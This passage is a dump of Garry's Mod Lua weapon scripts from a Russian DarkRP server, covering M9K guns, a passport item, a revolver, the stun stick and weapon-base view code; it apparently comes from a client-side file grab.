		SWEP.SlotPos = 2
	end
end
--PATH addons/m9k/lua/weapons/m9k_usas/shared.lua:
--[[
Server Name: Русский FastRP #1 [Быстрая загрузка][M9K]
Server IP:   37.230.137.126:27015
File Path:   addons/rp_wep/lua/weapons/m9k_usas/shared.lua
		 __        __              __             ____     _                ____                __             __         
   _____/ /_____  / /__  ____     / /_  __  __   / __/____(_)__  ____  ____/ / /_  __     _____/ /____  ____ _/ /__  _____
  / ___/ __/ __ \/ / _ \/ __ \   / __ \/ / / /  / /_/ ___/ / _ \/ __ \/ __  / / / / /    / ___/ __/ _ \/ __ `/ / _ \/ ___/
 (__  ) /_/ /_/ / /  __/ / / /  / /_/ / /_/ /  / __/ /  / /  __/ / / / /_/ / / /_/ /    (__  ) /_/  __/ /_/ / /  __/ /    
/____/\__/\____/_/\___/_/ /_/  /_.___/\__, /  /_/ /_/  /_/\___/_/ /_/\__,_/_/\__, /____/____/\__/\___/\__,_/_/\___/_/     
                                     /____/                                 /____/_____/                                  
--]]

-- Variables that are used on both client and server
SWEP.Gun = ("m9k_usas") -- must be the name of your swep but NO CAPITALS!
if (GetConVar(SWEP.Gun.."_allowed")) != nil then
	if not (GetConVar(SWEP.Gun.."_allowed"):GetBool()) then SWEP.Base = "bobs_blacklisted" SWEP.PrintName = SWEP.Gun return end
end
SWEP.Category				= "M9K Shotguns"
SWEP.Author				= ""
SWEP.Contact				= ""
SWEP.Purpose				= ""
SWEP.Instructions				= ""
SWEP.MuzzleAttachment			= "1" 	-- Should be "1" for CSS models or "muzzle" for hl2 models
SWEP.ShellEjectAttachment			= "2" 	-- Should be "2" for CSS models or "1" for hl2 models
SWEP.PrintName				= "USAS"		-- Weapon name (Shown on HUD)	
SWEP.Slot				= 3				-- Slot in the weapon selection menu
SWEP.SlotPos				= 29			-- Position in the slot
SWEP.DrawAmmo				= true		-- Should draw the default HL2 ammo counter
SWEP.DrawWeaponInfoBox			= false		-- Should draw the weapon info box
SWEP.BounceWeaponIcon   		= 	false	-- Should the weapon icon bounce?
SWEP.DrawCrosshair			= true		-- set false if you want no crosshair
SWEP.Weight				= 30			-- rank relative ot other weapons. bigger is better
SWEP.AutoSwitchTo			= true		-- Auto switch to if we pick it up
SWEP.AutoSwitchFrom			= true		-- Auto switch from if you pick up a better weapon
SWEP.HoldType 				= "ar2"		-- how others view you carrying the weapon
-- normal melee melee2 fist knife smg ar2 pistol rpg physgun grenade shotgun crossbow slam passive 
-- you're mostly going to use ar2, smg, shotgun or pistol. rpg and crossbow make for good sniper rifles

SWEP.ViewModelFOV			= 70
SWEP.ViewModelFlip			= true
SWEP.ViewModel				= "models/weapons/v_usas12_shot.mdl"	-- Weapon view model
SWEP.WorldModel				= "models/weapons/w_usas_12.mdl"	-- Weapon world model
SWEP.Base				= "bobs_gun_base"
SWEP.Spawnable				= true
SWEP.AdminSpawnable			= true

SWEP.Primary.Sound			= Sound("Weapon_usas.Single")		-- Script that calls the primary fire sound
SWEP.Primary.RPM			= 260			-- This is in Rounds Per Minute
SWEP.Primary.ClipSize			= 20		-- Size of a clip
SWEP.Primary.DefaultClip		= 60		-- Bullets you start with
SWEP.Primary.KickUp				= 1		-- Maximum up recoil (rise)
SWEP.Primary.KickDown			= 0.4		-- Maximum down recoil (skeet)
SWEP.Primary.KickHorizontal		= 0.7		-- Maximum up recoil (stock)
SWEP.Primary.Automatic			= true		-- Automatic = true; Semi Auto = false
SWEP.Primary.Ammo			= "Buckshot"			-- pistol, 357, smg1, ar2, buckshot, slam, SniperPenetratedRound, AirboatGun
-- Pistol, buckshot, and slam always ricochet. Use AirboatGun for a light metal peircing shotgun pellets

SWEP.SelectiveFire		= true

SWEP.Secondary.IronFOV			= 55		-- How much you 'zoom' in. Less is more! 	

SWEP.data 				= {}				--The starting firemode
SWEP.data.ironsights			= 1

SWEP.Primary.NumShots	= 10		-- How many bullets to shoot per trigger pull
SWEP.Primary.Damage		= 10	-- Base damage per bullet
SWEP.Primary.Spread		= .048	-- Define from-the-hip accuracy 1 is terrible, .0001 is exact)
SWEP.Primary.IronAccuracy = .048 -- Ironsight accuracy, should be the same for shotguns

-- Enter iron sight info and bone mod info below
SWEP.IronSightsPos = Vector(4.519, -2.159, 1.039)
SWEP.IronSightsAng = Vector(0.072, 0.975, 0)
SWEP.SightsPos = Vector(4.519, -2.159, 1.039)
SWEP.SightsAng = Vector(0.072, 0.975, 0)
SWEP.RunSightsPos = Vector (-3.0328, 0, 1.888)
SWEP.RunSightsAng = Vector (-24.2146, -36.522, 10)

SWEP.ReloadPos = Vector (-3.0328, 0, 1.888)
SWEP.ReloadsAng = Vector (-24.2146, -36.522, 10)

SWEP.WElements = {
	["fix2"] = { type = "Model", model = "models/hunter/blocks/cube025x05x025.mdl", bone = "ValveBiped.Bip01_R_Hand", rel = "", pos = Vector(22.416, 2.073, -5.571), angle = Angle(0, 0, -90), size = Vector(0.899, 0.118, 0.1), color = Color(0, 0, 0, 255), surpresslightning = false, material = "", skin = 0, bodygroup = {} },
	["magfix"] = { type = "Model", model = "models/XQM/cylinderx1.mdl", bone = "ValveBiped.Bip01_R_Hand", rel = "", pos = Vector(10.482, 1.389, 0.078), angle = Angle(-8.098, 0, 0), size = Vector(0.2, 0.589, 0.589), color = Color(0, 0, 0, 255), surpresslightning = false, material = "", skin = 0, bodygroup = {} }
}

function SWEP:Reload()

	if ( self.Weapon:Clip1() < self.Primary.ClipSize ) and (self.Owner:GetAmmoCount("buckshot") > 0 ) and not (self.Weapon:GetNWBool("Reloading")) then
		self.Weapon:SendWeaponAnim(ACT_SHOTGUN_RELOAD_START) 
		self.Weapon:SetNWBool("Reloading", true)
		if SERVER and !self.Owner:IsNPC() then
			self.ResetSights = CurTime() + 1.65
			self.Owner:SetFOV( 0, 0.3 )
			self:SetIronsights(false)
		end
		timer.Simple(.65, function() if not IsValid(self) then return end if not IsValid(self.Owner) then return end if not IsValid(self.Weapon) then return end
			if IsValid(self.Owner) and self.Weapon:GetClass() == self.Gun then 
				self.Weapon:EmitSound(Sound("Weapon_usas.draw"))
			end
		end)
		timer.Simple(.8, function() if not IsValid(self) then return end if not IsValid(self.Owner) then return end if not IsValid(self.Weapon) then return end
		if IsValid(self.Owner) and self.Weapon != nil then self:ReloadFinish() end end)
	end

end

function SWEP:ReloadFinish()
if not IsValid(self) then return end 
	if IsValid(self.Owner) and self.Weapon != nil then
		if self.Owner:Alive() and self.Weapon:GetClass() == self.Gun then
			self.Weapon:DefaultReload(ACT_SHOTGUN_RELOAD_FINISH)
			
			if !self.Owner:IsNPC() then
				self.ResetSights = CurTime() + self.Owner:GetViewModel():SequenceDuration() 
			end
			if SERVER and self.Weapon != nil then
				if ( self.Weapon:Clip1() < self.Primary.ClipSize ) and !self.Owner:IsNPC() then
					self.Owner:SetFOV( 0, 0.3 )
					self:SetIronsights(false)
			end

		local waitdammit = (self.Owner:GetViewModel():SequenceDuration())
		timer.Simple(waitdammit + .1, 
		function() if not IsValid(self) then return end if not IsValid(self.Owner) then return end if not IsValid(self.Weapon) then return end
		if self.Weapon == nil then return end
		self.Weapon:SetNWBool("Reloading", false)
		if self.Owner:KeyDown(IN_ATTACK2) and self.Weapon:GetClass() == self.Gun then 
			if CLIENT then return end
			if self.Scoped == false then
				self.Owner:SetFOV( self.Secondary.IronFOV, 0.3 )
				self.IronSightsPos = self.SightsPos					-- Bring it up
				self.IronSightsAng = self.SightsAng					-- Bring it up
				self:SetIronsights(true, self.Owner)
				self.DrawCrosshair = false
			else return end
		elseif ( self.Owner:KeyDown(IN_SPEED) and not self.Owner:GetNW2Bool("donate_upgrade_runngun") ) and self.Weapon:GetClass() == self.Gun then 
			self.Weapon:SetNextPrimaryFire(CurTime()+0.3)			-- Make it so you can't shoot for another quarter second
			self.IronSightsPos = self.RunSightsPos					-- Hold it down
			self.IronSightsAng = self.RunSightsAng					-- Hold it down
			self:SetIronsights(true, self.Owner)					-- Set the ironsight true
			self.Owner:SetFOV( 0, 0.3 )
		else return end
		end) 
			end
		end
	end
end

if GetConVar("M9KDefaultClip") == nil then
	print("M9KDefaultClip is missing! You may have hit the lua limit!")
else
	if GetConVar("M9KDefaultClip"):GetInt() != -1 then
		SWEP.Primary.DefaultClip = SWEP.Primary.ClipSize * GetConVar("M9KDefaultClip"):GetInt()
	end
end

if GetConVar("M9KUniqueSlots") != nil then
	if not (GetConVar("M9KUniqueSlots"):GetBool()) then 
		SWEP.SlotPos = 2
	end
end
--PATH addons/m9k/lua/weapons/m9k_vector/shared.lua:
--[[
Server Name: Русский FastRP #1 [Быстрая загрузка][M9K]
Server IP:   37.230.137.126:27015
File Path:   addons/rp_wep/lua/weapons/m9k_vector/shared.lua
		 __        __              __             ____     _                ____                __             __         
   _____/ /_____  / /__  ____     / /_  __  __   / __/____(_)__  ____  ____/ / /_  __     _____/ /____  ____ _/ /__  _____
  / ___/ __/ __ \/ / _ \/ __ \   / __ \/ / / /  / /_/ ___/ / _ \/ __ \/ __  / / / / /    / ___/ __/ _ \/ __ `/ / _ \/ ___/
 (__  ) /_/ /_/ / /  __/ / / /  / /_/ / /_/ /  / __/ /  / /  __/ / / / /_/ / / /_/ /    (__  ) /_/  __/ /_/ / /  __/ /    
/____/\__/\____/_/\___/_/ /_/  /_.___/\__, /  /_/ /_/  /_/\___/_/ /_/\__,_/_/\__, /____/____/\__/\___/\__,_/_/\___/_/     
                                     /____/                                 /____/_____/                                  
--]]

-- Variables that are used on both client and server
SWEP.Gun = ("m9k_vector") -- must be the name of your swep but NO CAPITALS!
if (GetConVar(SWEP.Gun.."_allowed")) != nil then
	if not (GetConVar(SWEP.Gun.."_allowed"):GetBool()) then SWEP.Base = "bobs_blacklisted" SWEP.PrintName = SWEP.Gun return end
end
SWEP.Category				= "M9K Submachine Guns"
SWEP.Author				= ""
SWEP.Contact				= ""
SWEP.Purpose				= ""
SWEP.Instructions				= ""
SWEP.MuzzleAttachment			= "1" 	-- Should be "1" for CSS models or "muzzle" for hl2 models
SWEP.ShellEjectAttachment			= "2" 	-- Should be "2" for CSS models or "1" for hl2 models
SWEP.PrintName				= "KRISS Vector"		-- Weapon name (Shown on HUD)	
SWEP.Slot				= 2				-- Slot in the weapon selection menu
SWEP.SlotPos				= 58			-- Position in the slot
SWEP.DrawAmmo				= true		-- Should draw the default HL2 ammo counter
SWEP.DrawWeaponInfoBox			= false		-- Should draw the weapon info box
SWEP.BounceWeaponIcon   		= 	false	-- Should the weapon icon bounce?
SWEP.DrawCrosshair			= true		-- set false if you want no crosshair
SWEP.Weight				= 30			-- rank relative ot other weapons. bigger is better
SWEP.AutoSwitchTo			= true		-- Auto switch to if we pick it up
SWEP.AutoSwitchFrom			= true		-- Auto switch from if you pick up a better weapon
SWEP.HoldType 				= "smg"		-- how others view you carrying the weapon
-- normal melee melee2 fist knife smg ar2 pistol rpg physgun grenade shotgun crossbow slam passive 
-- you're mostly going to use ar2, smg, shotgun or pistol. rpg and crossbow make for good sniper rifles

SWEP.ViewModelFOV			= 70
SWEP.ViewModelFlip			= true
SWEP.ViewModel				= "models/weapons/v_kriss_svs.mdl"	-- Weapon view model
SWEP.WorldModel				= "models/weapons/w_kriss_vector.mdl"	-- Weapon world model
SWEP.Base				= "bobs_gun_base"
SWEP.Spawnable				= true
SWEP.AdminSpawnable			= true
SWEP.FiresUnderwater = false

SWEP.Primary.Sound			= Sound("kriss_vector.Single")		-- Script that calls the primary fire sound
SWEP.Primary.RPM			= 1000			-- This is in Rounds Per Minute
SWEP.Primary.ClipSize			= 30		-- Size of a clip
SWEP.Primary.DefaultClip		= 60		-- Bullets you start with
SWEP.Primary.KickUp				= 0.15		-- Maximum up recoil (rise)
SWEP.Primary.KickDown			= 0.15		-- Maximum down recoil (skeet)
SWEP.Primary.KickHorizontal		= 0.15		-- Maximum up recoil (stock)
SWEP.Primary.Automatic			= true		-- Automatic = true; Semi Auto = false
SWEP.Primary.Ammo			= "smg1"			-- pistol, 357, smg1, ar2, buckshot, slam, SniperPenetratedRound, AirboatGun
-- Pistol, buckshot, and slam always ricochet. Use AirboatGun for a light metal peircing shotgun pellets

SWEP.SelectiveFire		= true

SWEP.Secondary.IronFOV			= 50		-- How much you 'zoom' in. Less is more! 	

SWEP.data 				= {}				--The starting firemode
SWEP.data.ironsights			= 1

SWEP.Primary.NumShots	= 1		-- How many bullets to shoot per trigger pull
SWEP.Primary.Damage		= 13	-- Base damage per bullet
SWEP.Primary.Spread		= .001	-- Define from-the-hip accuracy 1 is terrible, .0001 is exact)
SWEP.Primary.IronAccuracy = .001 -- Ironsight accuracy, should be the same for shotguns

-- Enter iron sight info and bone mod info below
SWEP.IronSightsPos = Vector(3.943, -0.129, 1.677)
SWEP.IronSightsAng = Vector(-1.922, 0.481, 0)
SWEP.SightsPos = Vector(3.943, -0.129, 1.677)
SWEP.SightsAng = Vector(-1.922, 0.481, 0)
SWEP.RunSightsPos = Vector(-3.701, -6.064, -0.551)
SWEP.RunSightsAng = Vector(-4.685, -62.559, 9.093)



if GetConVar("M9KDefaultClip") == nil then
	print("M9KDefaultClip is missing! You may have hit the lua limit!")
else
	if GetConVar("M9KDefaultClip"):GetInt() != -1 then
		SWEP.Primary.DefaultClip = SWEP.Primary.ClipSize * GetConVar("M9KDefaultClip"):GetInt()
	end
end

if GetConVar("M9KUniqueSlots") != nil then
	if not (GetConVar("M9KUniqueSlots"):GetBool()) then 
		SWEP.SlotPos = 2
	end
end
--PATH addons/a_passport/lua/weapons/passrus.lua:
if SERVER then
    AddCSLuaFile()
end

SWEP.PrintName = "Паспорт"
SWEP.Author = "математика"
SWEP.Instructions = "Левой кнопкой чтобы показать паспорт, правой кнопкой чтобы посмотреть свой паспорт"

SWEP.Spawnable = true
SWEP.AdminOnly = false

SWEP.Primary.ClipSize = -1
SWEP.Primary.DefaultClip = -1
SWEP.Primary.Automatic = false
SWEP.Primary.Ammo = "none"

SWEP.Secondary.ClipSize = -1
SWEP.Secondary.DefaultClip = -1
SWEP.Secondary.Automatic = false
SWEP.Secondary.Ammo = "none"

SWEP.Weight = 5
SWEP.AutoSwitchTo = true
SWEP.AutoSwitchFrom = true
SWEP.Slot = 5
SWEP.SlotPos = 1
SWEP.DrawAmmo = false
SWEP.DrawCrosshair = false
SWEP.FiresUnderwater = true
SWEP.Category = "Паспорт"
SWEP.HoldType = "pistol"

SWEP.ViewModelFOV = 54
SWEP.ViewModelFlip = false
SWEP.ViewModel = "models/weapons/kerry/w_rus_pass.mdl"
SWEP.WorldModel = "models/kerry/passport_rus.mdl"

SWEP.ShowViewModel = true
SWEP.ShowWorldModel = true

SWEP.Cooldown = 1
SWEP.LastPrimaryAttack = 0

function SWEP:PrimaryAttack()
    if CLIENT then
        if CurTime() < self.LastPrimaryAttack + self.Cooldown then return end
        self.LastPrimaryAttack = CurTime()

        local tr = self.Owner:GetEyeTrace()
        if tr.Entity and tr.Entity:IsPlayer() then
            local targetPlayer = tr.Entity
            net.Start("RequestPassportShow")
            net.WriteEntity(targetPlayer)
            net.SendToServer()
        else
            -- DarkRP.notify(self.Owner, 1, 4, "бубубубуб")
        end
    end
    self:SetNextPrimaryFire(CurTime() + 1)
end

function SWEP:SecondaryAttack()
    if CLIENT then
        if CurTime() < self.LastPrimaryAttack + self.Cooldown then return end
        self.LastPrimaryAttack = CurTime()

        net.Start("RequestOwnPassportShow")
        net.SendToServer()
    end
    self:SetNextSecondaryFire(CurTime() + 1)
end

function SWEP:Reload()
    return false
end

function SWEP:Initialize()
    if SERVER then
        self:SetHoldType("pistol")
    end
end

function SWEP:Deploy()
    if SERVER then
        self:SetHoldType("pistol")
    end
    return true
end

function SWEP:Holster()
    return true
end

function SWEP:OnRemove()
    self:Holster()
end

function SWEP:DrawWorldModel()
    if not IsValid(self.Owner) then
        self:DrawModel()
        return
    end

    local boneIndex = self.Owner:LookupBone("ValveBiped.Bip01_R_Hand")
    if not boneIndex then
        self:DrawModel()
        return
    end

    local bonePos, boneAng = self.Owner:GetBonePosition(boneIndex)
    if not bonePos then
        self:DrawModel()
        return
    end

    local offsetPos = Vector(6.6, 0, 0) 
    local offsetAng = Angle(0, 180, 270)

    local pos = bonePos + boneAng:Forward() * offsetPos.x + boneAng:Right() * offsetPos.y + boneAng:Up() * offsetPos.z
    local ang = boneAng

    ang:RotateAroundAxis(ang:Right(), offsetAng.p)
    ang:RotateAroundAxis(ang:Up(), offsetAng.y)
    ang:RotateAroundAxis(ang:Forward(), offsetAng.r)

    self:SetRenderOrigin(pos)
    self:SetRenderAngles(ang)

    self:DrawModel()
end

--PATH addons/weaponandcontent/lua/weapons/revolver/shared.lua:
AddCSLuaFile()

if CLIENT then
	SWEP.DrawCrosshair = true
	SWEP.PrintName = "Револьвер"
	SWEP.CSMuzzleFlashes = true
	
	SWEP.AimPos = Vector(-4.691, -3.958, 0.66)
	SWEP.AimAng = Vector(0, -0.216, 0)
	
	SWEP.SprintPos = Vector(1.185, -15.796, -14.254)
	SWEP.SprintAng = Vector(64.567, 0, 0)
	
	SWEP.ZoomAmount = 5
	SWEP.ViewModelMovementScale = 0.85
	SWEP.Shell = "smallshell"
	
	SWEP.IconLetter = "f"
	--killicon.AddFont("swb_357", "SWB_KillIcons", SWEP.IconLetter, Color(255, 80, 0, 150))
	
	SWEP.MuzzleEffect = "swb_pistol_large"
	SWEP.MuzzlePosMod = {x = 6.5, y =	30, z = -2}
	--SWEP.PosBasedMuz = true
end

SWEP.SpeedDec = 12
SWEP.BulletDiameter = 9.1
SWEP.CaseLength = 33

SWEP.PlayBackRate = 2
SWEP.PlayBackRateSV = 2

SWEP.Kind = WEAPON_PISTOL
SWEP.AutoSpawnable = true
SWEP.AllowDrop = true
SWEP.AmmoEnt = "item_ammo_revolver_ttt"

SWEP.Slot = 1
SWEP.SlotPos = 0
SWEP.NormalHoldType = "pistol"
SWEP.RunHoldType = "normal"
SWEP.FireModes = {"double"}
SWEP.Base = "swb_base"
SWEP.Category = "Weapons"

SWEP.Author			= "Spy"
SWEP.Contact		= ""
SWEP.Purpose		= ""
SWEP.Instructions	= ""

SWEP.ViewModelFOV	= 55
SWEP.ViewModelFlip	= false
SWEP.ViewModel		= "models/weapons/c_357.mdl"
SWEP.WorldModel		= "models/weapons/w_357.mdl"

SWEP.Spawnable			= true
SWEP.AdminSpawnable		= true

SWEP.Primary.ClipSize		= 6
SWEP.Primary.DefaultClip	= 6
SWEP.Primary.Automatic		= false
SWEP.Primary.Ammo			= "pistol"

SWEP.FireDelay = 0.45
SWEP.FireSound = Sound("Weapon_357.Single")
SWEP.Recoil = 1.1
SWEP.Chamberable = false

SWEP.HipSpread = 0.048
SWEP.AimSpread = 0.0075
SWEP.VelocitySensitivity = 0
SWEP.MaxSpreadInc = 0
SWEP.SpreadPerShot = 0
SWEP.SpreadCooldown = 0
SWEP.Shots = 1
SWEP.Damage = 47
SWEP.DeployTime = 1
--PATH gamemodes/darkrp/entities/weapons/stunstick/shared.lua:
AddCSLuaFile()

if CLIENT then
    SWEP.PrintName = "Stun Stick"
    SWEP.Slot = 0
    SWEP.SlotPos = 5
    SWEP.RenderGroup = RENDERGROUP_BOTH

    killicon.AddAlias("stunstick", "weapon_stunstick")

    CreateMaterial("darkrp/stunstick_beam", "UnlitGeneric", {
        ["$basetexture"] = "sprites/lgtning",
        ["$additive"] = 1
    })
end

DEFINE_BASECLASS("stick_base")

SWEP.Instructions = "Left click to discipline\nRight click to kill\nHold reload to threaten"
SWEP.IsDarkRPStunstick = true

SWEP.Spawnable = true
SWEP.Category = "DarkRP (Utility)"

SWEP.StickColor = Color(0, 0, 255)

function SWEP:Initialize()
    BaseClass.Initialize(self)

    self.Hit = {
        Sound("weapons/stunstick/stunstick_impact1.wav"),
        Sound("weapons/stunstick/stunstick_impact2.wav")
    }

    self.FleshHit = {
        Sound("weapons/stunstick/stunstick_fleshhit1.wav"),
        Sound("weapons/stunstick/stunstick_fleshhit2.wav")
    }
end

function SWEP:SetupDataTables()
    BaseClass.SetupDataTables(self)
    -- Float 0 = LastPrimaryAttack
    -- Float 1 = ReloadEndTime
    -- Float 2 = BurstTime
    -- Float 3 = LastNonBurst
    -- Float 4 = SeqIdleTime
    -- Float 5 = HoldTypeChangeTime
    self:NetworkVar("Float", 6, "LastReload")
end

function SWEP:Think()
    BaseClass.Think(self)
    if self.WaitingForAttackEffect and self:GetSeqIdleTime() ~= 0 and CurTime() >= self:GetSeqIdleTime() - 0.35 then
        self.WaitingForAttackEffect = false

        local effectData = EffectData()
        effectData:SetOrigin(self:GetOwner():GetShootPos() + (self:GetOwner():EyeAngles():Forward() * 45))
        effectData:SetNormal(self:GetOwner():EyeAngles():Forward())
        util.Effect("StunstickImpact", effectData)
    end
end

function SWEP:DoFlash(ply)
    if not IsValid(ply) or not ply:IsPlayer() then return end

    ply:ScreenFade(SCREENFADE.IN, color_white, 1.2, 0)
end

local stunstickMaterial = Material("effects/stunstick")
local stunstickBeam     = Material("!darkrp/stunstick_beam")
function SWEP:PostDrawViewModel(vm)
    if self:GetSeqIdleTime() ~= 0 or self:GetLastReload() >= CurTime() - 0.1 then
        local attachment = vm:GetAttachment(1)
        local pos = attachment.Pos
        cam.Start3D(EyePos(), EyeAngles())
            render.SetMaterial(stunstickMaterial)
            render.DrawSprite(pos, 12, 12, Color(180, 180, 180))
            for i = 1, 3 do
                local randVec = VectorRand() * 3
                local offset = (attachment.Ang:Forward() * randVec.x) + (attachment.Ang:Right() * randVec.y) + (attachment.Ang:Up() * randVec.z)
                render.SetMaterial(stunstickBeam)
                render.DrawBeam(pos, pos + offset, 3.25 - i, 1, 1.25, Color(180, 180, 180))
                pos = pos + offset
            end
        cam.End3D()
    end
end

local light_glow02_add = Material("sprites/light_glow02_add")
function SWEP:DrawWorldModelTranslucent()
    if CurTime() <= self:GetLastReload() + 0.1 then
        local bone = self:GetOwner():LookupBone("ValveBiped.Bip01_R_Hand")
        if not bone then self:DrawModel() return end
        local bonePos, boneAng = self:GetOwner():GetBonePosition(bone)
        if bonePos then
            local pos = bonePos + (boneAng:Up() * -16) + (boneAng:Right() * 3) + (boneAng:Forward() * 6.5)
            render.SetMaterial(light_glow02_add)
            render.DrawSprite(pos, 32, 32, Color(255, 255, 255))
        end
    end
    self:DrawModel()
end

local entMeta = FindMetaTable("Entity")
function SWEP:DoAttack(dmg)
    if CLIENT then return end

    self:GetOwner():LagCompensation(true)
    local trace = util.QuickTrace(self:GetOwner():EyePos(), self:GetOwner():GetAimVector() * 90, {self:GetOwner()})
    self:GetOwner():LagCompensation(false)

    local ent = trace.Entity
    if IsValid(ent) and ent.onStunStickUsed then
        ent:onStunStickUsed(self:GetOwner())
        return
    elseif IsValid(ent) and ent:GetClass() == "func_breakable_surf" then
        ent:Fire("Shatter")
        self:GetOwner():EmitSound(self.Hit[math.random(#self.Hit)])
        return
    end

    self.WaitingForAttackEffect = true

    local ent = self:GetOwner():getEyeSightHitEntity(
        self.stickRange,
        15,
        fn.FAnd{
            fp{fn.Neq, self:GetOwner()},
            fc{IsValid, entMeta.GetPhysicsObject},
            entMeta.IsSolid
        }
    )

    if not IsValid(ent) then return end
    if ent:IsPlayer() and not ent:Alive() then return end

	if ent:IsNPC() then return end
	
    if not ent:isDoor() and ent:OnGround() then
        ent:SetVelocity((ent:GetPos() - self:GetOwner():GetPos()) * 7)
    end

    if dmg > 0 then
        ent:TakeDamage(dmg, self:GetOwner(), self)
    end

    if ent:IsPlayer() or ent:IsVehicle() then
        self:DoFlash(ent)
        self:GetOwner():EmitSound(self.FleshHit[math.random(#self.FleshHit)])
    else
        self:GetOwner():EmitSound(self.Hit[math.random(#self.Hit)])
        if FPP and FPP.plyCanTouchEnt(self:GetOwner(), ent, "EntityDamage") then
            if ent.SeizeReward and not ent.beenSeized and not ent.burningup and self:GetOwner():isCP() and ent.Getowning_ent and self:GetOwner() ~= ent:Getowning_ent() then
                local amount = isfunction(ent.SeizeReward) and ent:SeizeReward(self:GetOwner(), dmg) or ent.SeizeReward

                self:GetOwner():addMoney(amount)
                DarkRP.notify(self:GetOwner(), 1, 4, DarkRP.getPhrase("you_received_x", DarkRP.formatMoney(amount), DarkRP.getPhrase("bonus_destroying_entity")))
                ent.beenSeized = true
            end
            ent:TakeDamage(1000-dmg, self:GetOwner(), self) -- for illegal entities
        end
    end
end

function SWEP:PrimaryAttack()
    BaseClass.PrimaryAttack(self)
    self:SetNextSecondaryFire(self:GetNextPrimaryFire())
    self:DoAttack(0)
end

function SWEP:SecondaryAttack()
    BaseClass.PrimaryAttack(self)
    self:SetNextSecondaryFire(self:GetNextPrimaryFire())
    self:DoAttack(10)
end

function SWEP:Reload()
    self:SetHoldType("melee")
    self:SetHoldTypeChangeTime(CurTime() + 0.1)

    if self:GetLastReload() + 0.1 > CurTime() then self:SetLastReload(CurTime()) return end
    self:SetLastReload(CurTime())
    self:EmitSound("weapons/stunstick/spark" .. math.random(1, 3) .. ".wav")
end

--PATH addons/weaponandcontent/lua/weapons/swb_base/sh_sounds.lua:
--[[
You can use this function to create weapon sound scripts if you plan to make weapons with separate sounds
Example usage:
SWB_RegisterSound("ExampleSound", "path/to/example/sound.format", 100)

Supported formats: .wav, .mp3, .ogg
The 'level' argument indicates how far the sound will be audible.
The 'pstart' and 'pend' arguments dictate the random pitch that will be used when the sound is played.
]]--

function SWB_RegisterSound(n, s, l, pstart, pend)
	local tbl = {channel = CHAN_STATIC,
		volume = 1,
		level = l,
		name = n,
		sound = s,
		pitchstart = pstart,
		pitchend = pend}
	
	sound.Add(tbl)
end

SWB_RegisterSound("SWB_Empty", "weapons/shotgun/shotgun_empty.wav", 60, 95, 112)
SWB_RegisterSound("SWB_Knife_Hit", {"weapons/knife/knife_hit1.wav", "weapons/knife/knife_hit2.wav", "weapons/knife/knife_hit3.wav", "weapons/knife/knife_hit4.wav"}, 70, 92, 122)
SWB_RegisterSound("SWB_Knife_HitElse", "weapons/knife/knife_hitwall1.wav", 70, 92, 122)
SWB_RegisterSound("SWB_Knife_Swing", {"weapons/knife/knife_slash1.wav", "weapons/knife/knife_slash2.wav"}, 65, 92, 122)
--PATH addons/weaponandcontent/lua/weapons/swb_base/cl_calcview.lua:
local FT, CT, cos1, cos2, ws, vel, ang
local Ang0, curang, curviewbob = Angle(0, 0, 0), Angle(0, 0, 0), Angle(0, 0, 0)
local reg = debug.getregistry()
local GetVelocity = reg.Entity.GetVelocity
local Length = reg.Vector.Length
local Right = reg.Angle.Right
local Up = reg.Angle.Up
local Forward = reg.Angle.Forward
local RotateAroundAxis = reg.Angle.RotateAroundAxis

local FrameTime, CurTime, IsValid, Angle, LocalPlayer = FrameTime, CurTime, IsValid, Angle, LocalPlayer
-- Localizing math functions
local math_cos = math.cos
local math_Approach = math.Approach
local math_Clamp = math.Clamp
local Lerp = Lerp
local LerpAngle = LerpAngle

SWEP.LerpBackSpeed = 10

function SWEP:CalcView(ply, pos, ang, fov)
    FT, CT = FrameTime(), CurTime()
    
    if self.ReloadViewBobEnabled then
        if self.IsReloading and self.Cycle <= 0.9 then
            att = self.Owner:GetAttachment(1)
            
            if att then
                ang = ang * 1
                
                self.LerpBackSpeed = 1
                curang = LerpAngle(FT * 10, curang, (ang - att.Ang) * 0.1)
            else
                self.LerpBackSpeed = math_Approach(self.LerpBackSpeed, 10, FT * 50)
                curang = LerpAngle(FT * self.LerpBackSpeed, curang, Ang0)
            end
        else
            self.LerpBackSpeed = math_Approach(self.LerpBackSpeed, 10, FT * 50)
            curang = LerpAngle(FT * self.LerpBackSpeed, curang, Ang0)
        end
        
        RotateAroundAxis(ang, Right(ang), curang.p * self.RVBPitchMod)
        RotateAroundAxis(ang, Up(ang), curang.r * self.RVBYawMod)
        RotateAroundAxis(ang, Forward(ang), (curang.p + curang.r) * 0.15 * self.RVBRollMod)
    end
    
    if self.dt.State == SWB_AIMING then
        if self.DelayedZoom then
            if CT > self.AimTime then
                if self.SnapZoom then
                    self.CurFOVMod = self.ZoomAmount
                else
                    self.CurFOVMod = Lerp(FT * 10, self.CurFOVMod, self.ZoomAmount)
                end
            else
                self.CurFOVMod = Lerp(FT * 10, self.CurFOVMod, 0)
            end
        else
            if self.SnapZoom then
                self.CurFOVMod = self.ZoomAmount
            else
                self.CurFOVMod = Lerp(FT * 10, self.CurFOVMod, self.ZoomAmount)
            end
        end
    else
        self.CurFOVMod = Lerp(FT * 10, self.CurFOVMod, 0)
    end
    
    fov = math_Clamp(GetConVarNumber('fov_desired') - self.CurFOVMod, 5, 90)
    
    if self.Owner then
        if self.ViewbobEnabled then
            ws = self.Owner:GetWalkSpeed()
            vel = Length(GetVelocity(self.Owner))
            
            if self.Owner:OnGround() and vel > ws * 0.3 then
                if vel < ws * 1.2 then
                    cos1 = math_cos(CT * 15)
                    cos2 = math_cos(CT * 12)
                    curviewbob.p = cos1 * 0.15
                    curviewbob.y = cos2 * 0.1
                else
                    cos1 = math_cos(CT * 20)
                    cos2 = math_cos(CT * 15)
                    curviewbob.p = cos1 * 0.25
                    curviewbob.y = cos2 * 0.15
                end
            else
                curviewbob = LerpAngle(FT * 10, curviewbob, Ang0)
            end
        end
    end
    
    return pos, ang + curviewbob * self.ViewbobIntensity, fov
end

function SWEP.CreateMove(move)
    ply = LocalPlayer()
    wep = ply:GetActiveWeapon()
    
    if IsValid(wep) and wep.SWBWeapon then
        if wep.dt and wep.dt.State == SWB_AIMING and wep.AimBreathingEnabled then
            CT = CurTime()
            ang = move:GetViewAngles()
            ang.p = ang.p - math_cos(CT * 1.25) * 0.003
            
            move:SetViewAngles(ang)
        end
    end
end

hook.Add("CreateMove", "SWEP.CreateMove (SWB)", SWEP.CreateMove)

function SWEP:AdjustMouseSensitivity()
    if self.dt.State == SWB_RUNNING then
